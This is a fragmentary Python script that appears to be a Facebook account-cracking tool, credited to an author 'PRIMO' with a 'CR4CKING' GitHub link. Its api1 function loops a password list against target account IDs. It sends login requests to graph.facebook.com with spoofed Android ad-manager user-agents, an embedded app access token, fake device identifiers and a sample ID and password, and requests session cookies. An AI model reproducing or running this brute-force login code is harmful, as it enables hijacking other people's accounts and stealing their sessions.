...
def S1():
	...
	e = ";[FBAN/FB4A;FBA51384705740;FBAN/MobileAdsManagerAndroid;FBAV/348.0.0.39.118;FBBV/338918985;FBDM/{density=2.625,width=1080,height=1920};FBLC/es_HK;FBRV/341598563;FBCR/Roshan AF;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.adsmanager;FBDV/SM-M305F;FBSV/8.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	ua = s + e	
	return ua
...
╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═╝░░░░░╚═╝░╚════╝░   
\033[1;37m-----------------------------------------------
\033[1;37m AUTHOR    : PRIMO\033[92;1m
\033[1;37m GITHUB    : https://github.com/KLUEN-sketch/PRIMO-CR4CKING
\033[1;37m VERSION   : \033[92;1m1\033[92;1m.\033[92;1m0
\033[1;37m═══════════════════════════════════════════════
\033[92;1m TRIAL     
    ...
    try:
                ...
                if x == ("***"):
                        ...
                        if xd in ['1','01']:
                                ...
                                line()
                                clear()
                                #print(' DO YOU WANT TO SHOW DEAD IDS :? (Y/N): ')
                                #line()
                                #cx=input(' CHOOSE : ')
...
def api1(ids,names,passlist):
	try:
		...
		for pw in passlist:
			...
			head = {'User-Agent':S1(),'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '36104', 'X-FB-SIM-HNI': '38256', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
			data = {'adid': '6752ca7b-5e50-49f3-a1d3-c22f5f4d7a26', 'format': 'json', 'device_id': '6273ed57-e2e9-4cf2-8c01-5ba3107aee26', 'email': '100037460374651', 'password': 'mdmahafujar', 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': '59b19742-6fbb-48f1-85bf-40d17f213199', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'ru_RU', 'client_country_code': 'RU', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '62f8ce9f74b12f84c123cc23437a4a32', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
